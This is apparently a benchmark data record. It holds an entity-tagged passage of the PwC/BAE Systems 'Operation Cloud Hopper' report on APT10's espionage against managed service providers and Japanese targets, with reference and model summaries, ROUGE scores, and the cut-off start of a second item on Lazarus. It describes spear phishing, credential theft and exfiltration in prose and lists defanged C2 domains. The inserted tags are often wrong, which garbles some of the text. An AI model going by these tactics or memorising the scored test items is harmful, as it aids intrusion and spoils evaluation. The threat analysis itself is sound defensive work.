[GPE] China - based threat actors of a wide range of industries and sectors in [GPE] Japan . This includes the targeting of commercial companies , and governmentTable [CARDINAL] 1 : [LANGUAGE] Japanese language filenames used by APT10agencies , both of which has resulted in the exfiltration of large amounts of data.9APT10 \u2019s standard compromise methodology begins with a spear phishing email sent to the target , usually with an executable attachment designed to lure the victim to open it . Analysis of the filenames associated with some of the latest APT10 malware samples , particularly from [DATE] late [DATE] 2016 , highlights the use of [LANGUAGE] Japanese language filenames which clearly indicates a campaign targeting [LANGUAGE] Japanese - speaking individuals . Further analysis of these files can be found in [ORG] Annex B.Table [CARDINAL] 1 shows some example file names being used by APT10 in this campaign . [PERSON] Japanese [PERSON] Filename [DATE] 1102()._exe [DATE] 2016\u30b7\u30f3\u30dd\u30b8\u30a6\u30e0A4\uff3f1025.exe ( [DATE] 28.11.07).exe [DATE] \u30ed\u30b7\u30a2\u306e\u3068\u300c\u300d\u306e.exeTranslation [DATE] 1102 Mainich [ORG] Newspaper ( answer)._exe [DATE] 2016 [ORG] Prefectural [ORG] University [ORG] Symposium A4_1025.exe Business contact invitation ( [CARDINAL] 28.11.07).exe Regarding provision of Individual number.exe [GPE] Japan - [GPE] US expansion deterrence conference ( e ) Foundation of [NORP] Russian historical association and [ORG] Composing [ORG] \u300c a unity \u300d state history textbook.exeThe following is an example of a malicious decoy document referencing [ORG] Mitsubishi [ORG] Heavy [ORG] Industries : Figure [CARDINAL] 10 : Decoy document based on press release from [NORP] Japanese firm [ORG] Mitsubishi [ORG] Heavy [ORG] Industries detailing the unveiling of their new [ORG] ABLASER - DUV ( Deep Ultraviolet Laser)9 url notable tactic of this APT10 subset is to register C2 domains that closely resemble legitimate [NORP] Japanese organisations . Table [CARDINAL] 2 shows a selection of the spoofed domains registered , alongside the email addresses listed at registration and the legitimate impersonated domains . Table 2 : [ORG] Domains observed being impersonated by APT10Domain bdoncloud[.]com cloud - kingl[.]com cloud - maste[.]com incloud - go[.]com incloud - obert[.]com meiji - ac - jp[.]com u - tokyo - ac - jp[.]com jica - go - jp[.]bike jica - go - jp[.]biz jimin - jp[.]biz mofa - go - jp[.]comImitating Generic Cloud themecmmb.org ccf.org.ph cwi.org.uk meiji.ac.jp u-tokyo.ac.jp [PERSON] jica.go.jp [PERSON] jica.go.jp jimin.jp [ORG] mofa.go.jpReligionCharityJapan [ORG] / [ORG] AcademicJapan [ORG] / [ORG] Public [ORG] SectorCatholic [ORG] Medical [ORG] Mission [ORG] Board Christ \u2019s [ORG] Commission [ORG] Fellowship \u2013 based in [GPE] Philippines [NORP] Christian Witnesses to [GPE] Israel [GPE] United [GPE] States Fund For Unicef The Salvation Army Meiji University in [GPE] Japan [GPE] Tokyo University in [GPE] Japan Japan International Cooperation Agency Japan International Cooperation Agency Liberal Democratic Party of Japan Ministry of Foreign AffairsThe top level C2 domains observed in this campaign share a number of features that can be used to further identify affiliated nodes . Table [CARDINAL] 3 displaying registrant information can be seen below : Table [CARDINAL] 3 : Known APT10 registration details showing a common name serverDomain belowto[.]com ccfchrist[.]comRegistrant email robertorivera@india.com wenonatmcmurray@india.comName [PERSON] Server [PERSON] Contact [PERSON] Name [PERSON] Contact Street ns1.ititch.com [PERSON] Roberto [PERSON] Rivera ns1.ititch.com [PERSON] Wenona McMurray904 Peck Street Manchester , NH 03103 824 [FAC] Ocala [FAC] Street [GPE] Winter [GPE] Park , FL 32789cloud - maste [ . ] com poulsenv[.]commeganfdelgado@india.comns1.ititch.com [PERSON] Megan [PERSON] Delgado [PERSON] 3328 Sigley Road Burlingame , [ORG] KS [ORG] 66413abellonav.poulsen@yandex.com ns1.ititch.com [PERSON] Abellona [PERSON] Poulsen2187 [PERSON] Findley [PERSON] Avenue [PERSON] Carrington , ND 58421unhamj[.]com juanitardunham@india.com wthelpdesk[.]com [PERSON] armandovalcala@india.comns1.ititch.com [PERSON] Juanita [PERSON] Dunham [CARDINAL] 745 [PERSON] Melody [PERSON] Lane [PERSON] Richmond , VA 23219 ns1.ititch.com [PERSON] Armando [PERSON] Alcala [CARDINAL] 608 [NORP] Irish [PERSON] Lane [PERSON] Madison , WI 5371812None of the domains share identical contact information other than stating that the respective registrants are based in the [GPE] US . The contact streets , organisations , and names are all distinct between domains . Some of the domains , that do resolve , share common [ORG] IP address space with the network of dynamic - DNS domains that we associate with Operation Cloud Hopper as detailed earlierin the report . This connection is highlighted in the infrastructure graph shown in Figure [CARDINAL] 11 below , where some [PERSON] ChChes C2 domains can be seen in the bottom left , while on the far right are the older APT10 domains referenced in previous reporting . Figure [CARDINAL] 11 : Infrastructure graph linking early PlugX domains to recent [ORG] ChChes domains13Motivations behind APT10 \u2019s targetingA short history of [GPE] China - based hacking [GPE] China - based threat actors have a long history of cyber espionage in the traditional political , military and defensive arena , as well as industrial espionage for economic gain . Some of the most notable of these events from [DATE] the [DATE] past [DATE] decade are shown belowFigure [CARDINAL] 12 : \u2013 Timeline of China - based hacking activity2006 - 13 : [NORP] APT1 conducted a widespread cyber espionage campaign against [CARDINAL] hundreds of organisations spanning a number of sectors . Most victims primarily conducted their business in [LANGUAGE] English and had a nexus with [GPE] China \u2019s strategic priorities.2010 : Technology , \ufb01nancial and defence sectors were targeted by [PERSON] Operation [PERSON] Aurora , a campaign attributed to [GPE] APT17 / [PERSON] Aurora [PERSON] Panda . The list of targets included [ORG] Google , who suffered the loss of intellectual property and attempted access to the [PERSON] Gmail accounts of human rights activists.2010 [CARDINAL] - [CARDINAL] 12 : Between 2010 and [DATE] 2012 organisations in the energy and material manufacturing sectors were targeted . These included [ORG] Westinghouse [ORG] Electric , who had technical and design speci\ufb01cations for pipes , pipe supports and routing stolen in [DATE] 2010 . Additionally , emails of senior decision - makers involved in the business relationship with a [NORP] Chinese state - owned enterprise were taken . In [DATE] 2012 , [ORG] SolarWorld was compromised with attackers stealing sensitive business information relating to manufacturing metrics , and production line information and costs . It is thought to have been targeted strategically at a time when [NORP] Chinese manufacturers of solar products were seeking to enter the [GPE] US market at below fair value prices.2014 : The data of [CARDINAL] 4.5 [CARDINAL] million members of [GPE] US - based healthcare organisation , [ORG] Community [ORG] Health [ORG] Systems was potentially accessed involved covert cyber attacks on global oil , energy and petrochemical companies and individuals in [GPE] Kazakhstan , [GPE] Taiwan , [GPE] Greece and the [GPE] US . The attackers used a number of vectors including social engineering and OS vulnerabilities to access proprietary operations and \ufb01nancial information2009 : [ORG] GhostNet is the alleged [NORP] Chinese group responsible for running a global campaign starting in [DATE] 2009 targeting foreign embassies and ministries , NGOs , news media institutions and [GPE] Tibet - related organisations.2013 : Operation [PERSON] Iron [PERSON] Tiger is an attack campaign attributed to APT31 , in which [GPE] US government contractors were targeted in the areas of technology , telecommunications , energy and manufacturing.2009 : [CARDINAL] Three medical device makers ( Medtronic , [ORG] Boston [ORG] Scienti\ufb01c , St. Jude Medical ) were allegedly compromised by [NORP] Chinese actors . Although the motive is unclear , patient data was not thought to be stolen , making industrial espionage the most likely intention.2014 - [CARDINAL] 15 : The personal data of [CARDINAL] over [CARDINAL] 20 [CARDINAL] million people was compromised from [FAC] the [FAC] US [FAC] Of\ufb01ce [FAC] of [FAC] Personnel [FAC] Management and attributed to [GPE] China - based actors . This included [ORG] Social [ORG] Security numbers as well as security clearance and job applications for government positions.2014 - [CARDINAL] 15 : Several healthcare \ufb01rms were targeted \u2013 [PERSON] Anthem , Premera [ORG] Blue [ORG] Cross and [ORG] CareFirst all suffered data breaches in [DATE] 2015 . These were linked to APT19.14Operation [PERSON] Cloud [PERSON] Hopper14APT10 alignment with previous [GPE] China - based hacking [ORG] Espionage attacks associated with [GPE] China - based threat actors , as noted above , have traditionally targeted organisations that are of strategic value to [NORP] Chinese businesses and where intellectual property obtained from such attacks could facilitate domestic growth or advancement . NextFigure [CARDINAL] 13 : Industries of interest outlined by \u2018 Made in [GPE] China equipmentThere has been significant open source reporting which has documented the alignment between apparent information collection efforts of [GPE] China - based threat actors and the strategic emerging industries documented in [GPE] China \u2019s [DATE] Five [DATE] Year [DATE] Plan ( FYP).10 The 13th [ORG] FYP was released in [DATE] March [DATE] 2016 and the sectors and organisations known to be targeted by APT10 are broadly in line with the strategic aims documented in this plan . These aims outlined in the [ORG] FYP will largely dictate the growth of businesses in [GPE] China and are , therefore , likely to also form part of [NORP] Chinese companies \u2019 business strategies . The latest [ORG] FYP describes [CARDINAL] five principles which underpin [GPE] China \u2019s goal of doubling its [DATE] 2010 GDP by [DATE] 2020 . At the forefront of these principles is innovation , largely focused around technological innovation , with [GPE] China expected to invest 2.5 % of GDP in research and development to attain technological advances , which are anticipated to contribute 60 % towards economic growth objectives.11 The areas of innovation expected to receive extensive investment include , next - generation communications , new energy , new materials , aerospace , biological medicine and smart manufacturing . In addition to the [ORG] FYP principle of innovation , [GPE] China is also promoting [CARDINAL] ten key industries in which it wants to improve innovation in manufacturing as part of the \u2018 Made in [GPE] China 2025 \u2019 initiative.12Agricultural machineryMedicineandmedical devicesNewmaterialsPowerequipment\u2018Made inChina 2025\u2019industriesRailway equipmentand high - techshipsObserved APT10 targeting is in line with many of the historic compromises we have outlined previously as originating from [GPE] China . This targeting spans industries that align with [GPE] China \u2019s 13th [ORG] FYP which would provide valuable information to advance the domestic innovation goals held within [GPE] China . Given the broad spectrum of priority industries , the compromise of MSPs represents an efficient method of information collection . This strategy also provides additional obfuscation for the actor as any data exfiltrated is taken back through the initial compromised company \u2019s systems , creating a much more difficult trail to follow.10 url [CARDINAL] 11 url [CARDINAL] 12 url a light on [ORG] APT10 \u2019s [ORG] methodologyMSP1 APT10 ex\ufb01ltrates stolen data back through MSPs to infrastructure controlled by the threat actorM S P c ustomer0 PAusend for ex \ufb01 ltratioTar g e ted [ORG] MSPCusto m e r2 [ORG] MSP customers who align to APT10 \u2019s targeting pro\ufb01le are accessed by the threat actor using the MSPs legitimate access3 Data of interest to APT10 is accessed by the threat actor moving laterally through systemsr getedaT5 Compressed \ufb01les \ufb01lled with stolen data are moved from the [ORG] MSP customer \u2019s network back onto the [ORG] MSP networkMSPDat a4 [ORG] MSP customer data collected by [ORG] APT and compressed , ready for ex\ufb01ltration from the networkFigure [CARDINAL] 14 : Decoy document used by APT10 to target the [NORP] Japanese education sectorAPT10 has been known to use research from their reconnaissance to obtain company email addresses , and then craft a message containing either a malicious attachment or a link to a malicious site . This section details changes made to APT10 tools , techniques and procedures ( TTPs ) [DATE] post-2014 , following its shift from [ORG] Poison Ivy to PlugX. These TTPs have been identified as part of our incident response and threat intelligence investigations and have been used in both of the recent campaigns we have encountered . The examples provided in this section will be drawn from both of those campaigns . Reconnaissance and targetingIt is often difficult to identify the early stages of a threat actor \u2019s preparation for an attack as these initial activities tend to occur below the line of visibility . Our analysis of the most recently used decoy documents by APT10 in its spear phishing campaigns , which is the primary delivery method of its payloads , indicates the actor performs a significant level of research on its targets . In line with commonly used [ORG] APT actor methodologies , the threat actor aligns its decoy documents to a topic of interest relevant to the recipient . In the example shown in Figure [CARDINAL] 14 to the right , an official document hosted on [ORG] the [ORG] Japan [ORG] Society [ORG] for [ORG] the [ORG] Promotion [ORG] of [ORG] Science website was weaponised and deployed as part of a spear phishing campaign against a [NORP] Japanese target in the education sector.16Figure [CARDINAL] 15 : Timeline of APT10 related activitiesSummary of [ORG] APT10 [ORG] activity2009 [ORG] Group \ufb01rst detected [NORP] Targets [NORP] East [NORP] Asian [NORP] Policy organisationsQ4 2014 Other eventsAugust 2013 [ORG] FireEye [ORG] - [ORG] Poison Ivy : reports on links between [NORP] APT1 and organisationsAs part of the same campaign , we have also observed an email sent by APT10,13 referencing a Scientific Research Grant Program , and targeting various [NORP] Japanese education institutes including [ORG] Meiji [ORG] University14 and Chuo University.15 The email included a zip file containing a link to download a payload from [CARDINAL] one of APT10 \u2019s servers , the ChChes Powersploit exploit , detailed in Annex B.Initial compromise and lateral movement Once on a target network , the actor rapidly deploys malware to establish a foothold , which may include [CARDINAL] one or more systems that provide sustained access to a victim \u2019s network . As APT10 works to gain further privileges and access , it also conducts internal reconnaissance , mapping out the network using common Windows tools , and in later stages of the compromise using open source pentesting tools , detailed in Annex B.This reconnaissance is run in parallel with the actor ensuring that it has access to legitimate credentials . We have observed that in cases where APT10 has infiltrated a target via an [ORG] MSP , it continues to use the MSPs credentials . In order to gain any further credentials , APT10 will usually deploy credential theft tools such as mimikatz or [PERSON] PwDump , sometimes using [ORG] DLL load order hijacking , to use against a domain controller , explained further in [PERSON] Annex [PERSON] B. [PERSON] Regular communications checks are then executed in order to maintain this level of access . In most cases , these stolen [ORG] MSP credentials have provided administrator or domain administrator privileges . We have observed the threat actor copying malware over to systems in a compromised environment , which did not have13 url [CARDINAL] 14 url [CARDINAL] 15 url outbound internet access . In [CARDINAL] one of these instances , the threat actor spent [TIME] more [TIME] than [TIME] an [TIME] hour attempting to establish an outbound connection using [LOC] PlugX until it realised that the host had no internet access , at which point the malware and all supporting files where deleted . APT10 achieves persistence on its targets primarily by using scheduled tasks or Windows services in order to ensure the malware remains active regardless of system reboots . APT10 heavily leverages the shared nature of client - side [ORG] MSP infrastructure to move laterally between MSPs and other victims . Systems that share access and thus credentials , from both a [ORG] MSP and [CARDINAL] one of its clients serve as a way of hopping between the [CARDINAL] two . Figure [CARDINAL] 16 : [GPE] Client \u2013 [ORG] MSP shared infrastructureClie n t i n f r a structureM [WORK_OF_ART] S [WORK_OF_ART] Pi [WORK_OF_ART] n frastructureSystems sharing credentials across the client and the [ORG] MSP are of particular interest to APT10 , and are commonly used by the threat actor in order to gain access to new areas of the [PRODUCT] network17APT10 simultaneously targets both low profile and high value systems to gain network persistence and a high level of access respectively . For example , in addition to compromising high value domain controllers and security servers , the threat actor has also been observed identifying and subsequently installing malware on low profile systems that provide non - critical support functions to the business , and are thus less likely to draw the attention of system administrators . As part of the long - term access to victim networks , we have observed APT10 consistently install updates and new malware on compromised systems . In the majority of instances APT10 used either a reverse shell or RDP connection to install its malware ; the actor also uses these methods to propagate across the network . Communication checks are usually conducted using native Windows tools such as ping.exe , net.exe and tcping.exe . The actor will frequently \u2018 net use \u2019 to several machines within [TIME] several [TIME] seconds , connecting for [PERCENT] as [PERCENT] little [PERCENT] as [PERCENT] five [PERCENT] seconds , before disconnecting . Further details are provided in Annex B.Network hopping and exfiltration Once APT10 have a foothold in victim networks , using either legitimate [ORG] MSP or local domain credentials , or their sustained malware such as PlugX , [ORG] RedLeaves or Quasar RAT , they will begin to identify systems of interest . The operator will either access these systems over RDP , or browse folders using [ORG] Remote [ORG] Access [ORG] Trojan ( RAT ) functionality , to identify data of interest . This data is then staged for exfiltration in multi - part archives , often placed in [LAW] the [LAW] Recycle [LAW] Bin , using either [ORG] RAR or [ORG] TAR . The compression tools are often launched via a remote command execution script which is regularly named \u2018 t.vbs \u2019 and is a customised version of an open source [ORG] WMI command executor which pipes the command output back to the operator . We have observed these archives being moved outside of the victim networks , either back into to the [ORG] MSP environments or to external [ORG] IP addresses in [CARDINAL] two methods , which are also performed via the command line using t.vbs : [CARDINAL] 1 . Mounting the target external network share with \u2018 net use\u2019and subsequently using the legitimate [NORP] Robocopy tool to transfer the data ; and,2 . Using the legitimate Putty Secure Copy Client ( PSCP),sometimes named rundll32.exe , to transfer the data directly to the [ORDINAL] third party system.18Using these techniques , APT10 \u2018 pushes \u2019 data from victim networks to other networks they have access to , such as other [ORG] MSP or victim networks , then , using similar methods , \u2018 pulls \u2019 the data from those networks to locations from which they can directly obtain it , such as the threat actor \u2019s C2 servers . APT10 \u2019s ability to bridge networks can therefore be summarized as : \u2022 Use of legitimate [ORG] MSP credentials to management systemswhich bridge the [ORG] MSP and multiple [ORG] MSP customer networks;\u2022 Use of RDP to interactively access systems in both the MSPmanagement network and [ORG] MSP customer networks;\u2022 Use of t.vbs to execute command line tools ; and , \u2022 Use of PSCP and [PERSON] Robocopy to transfer data . APT10 malware We classify APT10 \u2019s malware into [CARDINAL] two distinct areas : tactical and sustained . The tactical malware , historically [ORG] EvilGrab , and now [PERSON] ChChes ( and likely also [ORG] RedLeaves ) , is designed to be lightweight and disposable , often being delivered through spear phishing . Once executed , tactical malware contains the capability to profile the network and manoeuvre through it to identify a key system of interest . The sustained malware , historically [ORG] Poison Ivy , PlugX and now [ORG] Quasar provides a more comprehensive feature set . Intended to be deployed on key systems , the sustained malware facilitates long - term remote access and allows for operators to more easily carry out administration tasks . Since [DATE] late [DATE] 2016 , we have seen the threat actor develop several bespoke malware families , such as [ORG] ChChes and [ORG] RedLeaves . Additionally , it has taken the open source malware , Quasar , and extended its capabilities , ensuring the incrementation of the internal version number as it does so . We have also observed APT10 use [ORG] DLL search order hijacking and sideloading , to execute some modified versions of open - source tools . For example , [ORG] PwC [GPE] UK has observed APT10 compiling DLLs out of tools , such as [PRODUCT] MimiKatz and PwDump6 , and using legitimate , signed software , such as [PERSON] Windows [PERSON] Defender to load the malicious payloads . In Annex B we provide detailed analysis of several of the threat actor \u2019s tools as well as the common Windows tools we have observed being used . Timeline Alongside APT10 \u2019s TTPs , we have observed a \u2018 retooling \u2019 cycle . Given the pace of technological change and the wide range of freely available online tools and scripts , it is not unusual for an actor to re - evaluate its capabilities and to benchmark multiple offerings against each other . We have observed a decline in the deployment of some of APT10 \u2019s traditional core tool set , and witnessed an increase in the development and deployment of additional new tools which combine in - house development and open source projects . We assess that this is highly likely due to the public release of APT10 malware by cyber security vendors . Throughout our investigations , we have observed multiple deployments of the [LOC] PlugX malware from [DATE] 2014 to at least 2016 . This , along with the downturn in the use of Poison Ivy , supports the notion that a major retooling operation took place post [DATE] 2014 . Additional analysis of the infrastructure associated with each distinct version of PlugX also shows an increase in maturity over time . Earlier PlugX versions were configured with legacy domains and [ORG] IP addresses , which were originally isolated and more obvious , whereas more recent versions have demonstrated a standardised convention for domain names and [ORG] IP selection . During our analysis of victim networks , we were able to observe APT10 once again initiate a retooling cycle in [DATE] late [DATE] 2016 . We observed the deployment and testing of multiple versions of Quasar malware,16 and the introduction of the bespoke malware families [PERSON] ChChes and [ORG] RedLeaves . We assess it is highly likely that due to the frequent public release of information linking PlugX with [GPE] China - based threat actors , continual long - term use had become unsustainable , introducing an additional operational overhead that is easily attributable to [GPE] China - based threat actors.16 url is a constantly evolving , highly persistent [GPE] China - based threat actor that has an ambitious and unprecedented collection programme against a broad spectrum of sectors , enabled by its strategic targeting . Since exposure of its operations in [DATE] 2013 , APT10 has made a number of significant changes intended to thwart detection of its campaigns . PwC [GPE] UK and [ORG] BAE [ORG] Systems , working closely with industry and government , have uncovered a new , unparallelled campaign which we refer to as Operation Cloud Hopper . This operation has targeted managed IT service providers , the compromise of which provides APT10 with potential access to [CARDINAL] thousands of further victims . An additional campaign has also been observed targeting [NORP] Japanese entities . APT10 \u2019s malware toolbox shows a clear evolution from malware commonly associated with [GPE] China - based threat actors towards bespoke in - house malware that has been used in more recent campaigns ; this is indicative of APT10 \u2019s increasing sophistication , which is highly likely to continue . The threat actor \u2019s known working hours align to Chinese Standard Time ( [ORG] CST ) and its targeting corresponds to that of other known [GPE] China - based threat actors , which supports our assessment that these campaigns are conducted by APT10.This campaign serves to highlight the importance of organisations having a comprehensive view of their threat profile , including that of their supply chain \u2019s . More broadly , it should also encourage organisations to fully assess the risk posed by their [ORDINAL] third party relationships , and prompt them to take appropriate steps to assure and manage these . A detailed technical annex supplements this main report , which provides further information about the tools and techniques used by APT10 and contains Indicators of Compromise relating to all of this threat actor \u2019s known campaigns . These have already been provided to [ORG] the [ORG] National [ORG] Cyber [ORG] Security [ORG] Centre for dissemination through their usual channels.20Appendices21Appendix ACollaboration between [NORP] PwC UK and [ORG] BAE [ORG] Systems [ORG] PwC and [ORG] BAE [ORG] Systems \u2019 respective [ORG] Threat [ORG] Intelligence teams share a mutual interest in new cyber threats . [ORG] PwC and [ORG] BAE [ORG] Systems partnered through their membership of [ORG] the [ORG] Cyber [ORG] Incident [ORG] Response ( [ORG] CIR ) scheme to share intelligence and develop the most comprehensive picture possible of this threat actor \u2019s activities . Information sharing like this underpins the security research community and serves to aid remediation and inform decisions that companies make about their security needs . Probabilistic language Interpretations of probabilistic language ( for example , \u201c likely \u201d or \u201c almost certainly \u201d ) vary widely , and to avoid misinterpretation we have used the following qualitative terms within this report when referring to the level of confidence we have in our assessments . Unless otherwise stated , our assessments are not based on statistical analysis . Qualitative term Remote or highly likely Improbable or unlikely Realistic probability Probable or likely [PERSON] Highly probable or highly likely Almost certainAssociated probability range [PERCENT] Less [PERCENT] than [PERCENT] 10 % More than 90%22Appendix BPwC [GPE] UK reporting PwC UK Threat Intelligence has previously published a range of APT10 related reporting , both in the public domain and via our subscription service . These reports are as follows:\u2022 APT10 resumes operations with a vengeance , [PERSON] inThreats Under the Spotlight \u2013 CTO - TUS-20170321 - 01A\u2022 menuPass Returns with [GPE] New [GPE] Malware and [ORG] NewAttacks [ORG] Against [ORG] Japanese [ORG] Academics [ORG] and [ORG] Organizations , url [ORG] com/2017/02 / unit42 - menupass - returns - new - malware- new - attacks - japanese - academics - organizations/ , published [DATE] 2017 [DATE] - 02 [DATE] - [DATE] 16 . APT10 attacks on [NORP] Japanese academics . Includes info on [PERSON] ChChes ( technical ) , Poison Ivy and PlugX.\u2022 [ORG] NetEaseX and [PRODUCT] the [PRODUCT] Secret [PRODUCT] Key [PRODUCT] to [PRODUCT] Lisboa [PRODUCT] \u2013 CTO [PRODUCT] - TIB-\u2022 [PERSON] ChChes \u2013 Malware that [ORG] Communicates with C&C20170313 - 01A \u2013 BlackDLL\u2022 APT10 \u2019s .NET Foray \u2013 CTO - TIB-20170301 - 01B \u2013 Quasar\u2022 APT10 pauses for [EVENT] Chinese [EVENT] New [EVENT] Year , in Threats Underthe Spotlight \u2013 CTO - TUS-20170220 - 01A\u2022 CVNX \u2019s sting in the tail \u2013 CTO - TIB-20170123 - 01A \u2013 ChChes ( Scorpion ) Malware\u2022 [GPE] China and [GPE] Japan : [ORG] APT to dispute -CTO - SIB-20170119 - 01A\u2022 [ORG] Taiwan [ORG] Presidential Election : A Case Study onThematic Targeting , url security_updates/2016/03 / taiwant - election - targetting . html , published [DATE] 2016 [DATE] - 03 [DATE] - [DATE] 17 . Overview of [ORG] EvilGrab and it being used against [NORP] Asian targets , specifically around the [DATE] 2016 [NORP] Taiwanese [PERSON] election\u2022 [PERSON] Scanbox [PERSON] II \u2013 CTO - TIB-20150223 - 01A\u2022 \u201c IST [WORK_OF_ART] - [WORK_OF_ART] Red [WORK_OF_ART] Apollo-002 \u2013 [ORG] Red [ORG] Apollo [ORG] Tearsheet \u201d [ORDINAL] Third party reports A number of organisations have also published related reporting , as follows:\u2022 [ORG] RedLeaves \u2013 Malware Based on Open Source RAT \u2013 url based-on-open-source-rat.html \u2013 Further technical reporting on [ORG] RedLeaves , revealing links to an open source RAT.\u2022 The relevance between the attacker group menuPassand malware ( Poison Ivy , PlugX , [PERSON] ChChes ) , https:// www.lac.co.jp/lacwatch/people/20170223_001224.html , published [DATE] 2017 [DATE] - 02 [DATE] - 23 . Links APT10 to [PERSON] ChChes , Poison Ivy and [ORG] PlugX.Servers [ORG] Using [ORG] Cookie [ORG] Headers , url jp/2017/02 / chches - malware--93d6.html , published [DATE] 2017 [DATE] - 02 [DATE] - [DATE] 15 . Technical overview of [PRODUCT] ChChes malware with IOCs.\u2022 PlugX TrendMicro \u201c tearsheet \u201d , url plugx , published [DATE] 2016 [DATE] - 09 [DATE] - 07 . Technical info and IOCs for PlugX.\u2022 [WORK_OF_ART] A [WORK_OF_ART] Detailed [WORK_OF_ART] Examination [WORK_OF_ART] of [WORK_OF_ART] the [WORK_OF_ART] Siesta [WORK_OF_ART] Campaign , url threat - research/2014/03 / a - detailed - examination - of - the- siesta-campaign.html , published [DATE] 2014 [DATE] - 03 [DATE] - [DATE] 12 . Provides a detailed analysis of activity dubbed the Siesta campaign.\u2022 POISON IVY : Assessing Damage and [ORG] ExtractingIntelligence , url fireeye - www / global / en / current - threats / pdfs / rpt - poison- ivy.pdf , published 2013 - 08 - 21 . Technical report on Poison Ivy and campaigns that have used it , including [ORG] menuPass.\u2022 [ORG] EvilGrab [ORG] Malware Family Used [WORK_OF_ART] In [WORK_OF_ART] Targeted [WORK_OF_ART] Attacks [WORK_OF_ART] InAsia , url intelligence / evilgrab - malware - family - used - in - targeted- attacks - in - asia/ , published 2013 - 09 - 18 . Technical overview of EvilGrab.\u2022 CrowdCasts Monthly : You Have an Adversary Problem , url [DATE] monthly - you - have - an - adversary - problem , published [CARDINAL] 2013 [CARDINAL] - [CARDINAL] 10 [CARDINAL] - [CARDINAL] 16 , a presentation on [NORP] Chinese actors including [ORG] APT , crime and hacktivist . Includes section on [NORP] Stone [NORP] Panda ( APT10).\u2022 PlugX : [ORG] New [ORG] Tool [ORG] For [ORG] a [ORG] Not [ORG] So [ORG] New [ORG] Campaign , url plugx - new - tool - for - a - not - so - new - campaign/ , published [DATE] 2012 [DATE] - 09 [DATE] - [DATE] 10 . Gives an introduction to PlugX.\u2022 Pulling the Plug on PlugX , url com / vinfo / us / threat - encyclopedia / web - attack/112/ pulling - the - plug - on - plugx , published [DATE] 2012 [DATE] - 08 [DATE] - 04 . Gives a technical overview of PlugX and what it is used for.23About PwC At PwC , our purpose is to build trust in society and solve important problems . We \u2019re a network of firms in [CARDINAL] 157 countries with [CARDINAL] more [CARDINAL] than [CARDINAL] 223,000 people who are committed to delivering quality in assurance , advisory and tax services . PwC [GPE] UK \u2019s cyber security team is a part of this mission , helping clients around the world to assess , build and manage their cyber security capabilities and to identify and respond to incidents through a range of services including threat intelligence , threat detection and incident response . We are [ORG] BAE [ORG] Systems At [ORG] BAE [ORG] Systems , we provide some of the world \u2019s most advanced technology defence , aerospace and security solutions . At [ORG] BAE [ORG] Systems [ORG] Applied [ORG] Intelligence , we help nations , governments and businesses around the world defend themselves against cybercrime , reduce their risk in the connected world , comply with regulation , and transform their operations . We do this using our unique set of solutions , systems , experience and processes \u2013 often collecting and analysing huge volumes of data . This publication has been prepared for general guidance on matters of interest only , and does not constitute professional advice . You should not act upon the information contained in this publication without obtaining specific professional advice . No representation or warranty ( express or implied ) is given as to the accuracy or completeness of the information contained in this publication , and , to the extent permitted by law , [ORG] PricewaterhouseCoopers [ORG] LLP , its members , employees and agents do not accept or assume any liability , responsibility or duty of care for any consequences of you or anyone else acting , or refraining to act , in reliance on the information contained in this publication or for any decision based on it . \u00a9 [CARDINAL] 2017 PricewaterhouseCoopers LLP . All rights reserved . In this document , \u201c PwC \u201d refers to the [GPE] UK member firm , and may sometimes refer to the [ORG] PwC network . Each member firm is a separate legal entity . Please see www.pwc.com/structure for further details.170328 - 155605 - GC - [GPE] UK", "generated_text": "PwC UK; BAE Systems; a new cyber espionage campaign; Chinese; APT10; MSPs; 2016; access; enterprises; remote access; PlugX malware; late 2016; connectivity; Poison Ivy; Poison Ivy data; analysis; techniques; analysis; the malware; the attacker; persistence; detection; the campaign; techniques; the attack; control; servers; infrastructure; bespoke malware; customised tools; the campaign; indicators; compromise; defense; RAR; persistence; evidence; Analysis; Chinese; the threat actor; Indian; Japan; IP addresses; persistent attacks; tools; the threat actor; victims.", "ref_text": "<START-1>The report details a hacking campaign called Operation Cloud Hopper conducted by a China-based threat actor group known as APT10. The campaign targeted managed IT service providers (MSPs) in multiple countries as a supply chain attack to gain access to their clients' networks and sensitive data. APT10 has been active since at least 2009, initially targeting government, defense, and technology organizations. After their Poison Ivy malware was publicly exposed in 2013, APT10 upgraded their tools, moving to PlugX and expanding their targeting focus. In 2016-2017, APT10 compromised several major MSPs, utilizing their credentials and network access to move laterally and steal data from customer networks. The wide access MSPs have to client systems and data made them an ideal attack vector. Once inside a client network, APT10 used various malware and hacking tools to gather and exfiltrate targeted files. Concurrently, APT10 also directly targeted Japanese entities with spear phishing emails containing custom malware called ChChes. They spoofed government and academic institutions in the phishing messages. APT10 heavily obfuscated their infrastructure and operations. Analysis of IP addresses, domain registrations, malware compile times, and activity patterns aligns with China time zone and shows organizational sophistication. The industries targeted also fit China's strategic economic goals. Overall, the report profiles APT10's tactics, techniques, and procedures, showing how they evolved their malware and operations to increase effectiveness. It also demonstrates supply chain attacks as an emerging cyber threat vector. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.39999999999999997, "gpt3/lexical/rouge_rouge2": 0.11488250652741513, "gpt3/lexical/rouge_rougeL": 0.2285714285714286, "gpt3/lexical/rouge_rougeLsum": 0.2285714285714286, "gpt3_generated_text": ["PwC UK and BAE Systems have conducted research on a new cyber espionage campaign conducted by a Chinese threat actor known as APT10. The campaign, called Operation Cloud Hopper, targets managed IT service providers (MSPs) and gives the threat actor access to intellectual property and sensitive data of the MSPs and their clients globally. The campaign began in 2016 and has seen an increase in scale and capability, with the use of custom tools and bespoke malware. The threat actor primarily uses dynamic-DNS domains for command and control infrastructure, which are connected to previous operations. APT10 focuses on espionage, targeting intellectual property and sensitive data, and has exfiltrated a high volume of data from multiple victims. PwC UK and BAE Systems hope that by releasing this research, prevention and detection capabilities can be improved and further understanding of the threat actor's techniques can be developed."]}, {"split_name": "test", "sample_id": "test_78", "prompt_text": "Extract the keywords: blog.talosintelligence.com /2022/09 / lazarus - magicrat.html MagicRAT : Lazarus \u2019 latest gateway into victim networksBy [PERSON] Jung soo An , [PERSON] Asheer [PERSON] Malhotra and [ORG] Vitor [ORG] Ventura . [PERSON] Cisco [PERSON] Talos has discovered a new remote access trojan ( RAT ) we 're calling \" [PERSON] MagicRAT , \" developed and operated by the [ORG] Lazarus [ORG] APT group , which the [GPE] U.S. government believes is a [NORP] North [NORP] Korean state - sponsored actor . [ORG] Lazarus deployed [PERSON] MagicRAT after the successful exploitation of vulnerabilities in VMWare [GPE] Horizon platforms . We 've also found links between [PERSON] 